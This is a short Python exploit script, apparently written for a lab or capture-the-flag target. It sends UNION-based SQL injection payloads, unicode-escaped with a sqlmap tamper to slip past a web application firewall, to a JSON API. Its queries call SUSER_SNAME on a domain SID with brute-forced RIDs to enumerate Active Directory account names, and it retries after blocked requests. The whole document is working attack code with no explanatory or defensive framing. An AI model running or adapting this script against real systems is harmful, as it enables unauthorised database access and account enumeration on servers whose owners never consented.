import json
from matplotlib.font_manager import json_dump
import requests
import sys
import json
import time
import binascii
import struct
sys.path.append('./sqlmap/')
from tamper.charunicodeescape import tamper

# accept cli arguments for IP, Port, and SID
IP = sys.argv[1]
PORT = sys.argv[2]
sid =  "0x0105000000000005150000001C00D1BCD181F1492BDFC236"


print("IP is %s and the Domain SID is %s" % (str(IP), str(sid)))

# build Host URL 
host = "http://{}:{}/api/getColleagues".format(str(IP),str(PORT))


def bruteRequests(start,end):
    for i in range(start,end):
        print("Trying count {}".format(str(i)))
        requestObject = buildRequestObject(sid,i)
        res = makeRequest(host,requestObject)
        time.sleep(4)
        

def makeRequest(url,formattedSQLi,attempt=0):

    data = {
        'name':formattedSQLi
    }
    data = json.dumps(data)

    post = requests.post(host,headers = {"Content-Type": "application/json"},data=data)
    if post.status_code == 403:
        if attempt < 1:
            print("encountered WAF, sleeping for 30 seconds")
            time.sleep(10) # TODO set back to 30
            attempt = attempt + 1
            return makeRequest(url,formattedSQLi,attempt)
        else: return "Failed"
    elif post.status_code == 200:
        try:
            return print(json.loads(post.text)[0]["email"])
        except:
            return "done"
    else: return "done"

def buildRequestObject(sid,rid):
    fRid = binascii.hexlify(struct.pack("<I", rid)).decode()
    return tamper(f"Jerry 'union select 1,2,3,4, SUSER_SNAME ({sid+fRid}) --")
bruteRequests(500,510)
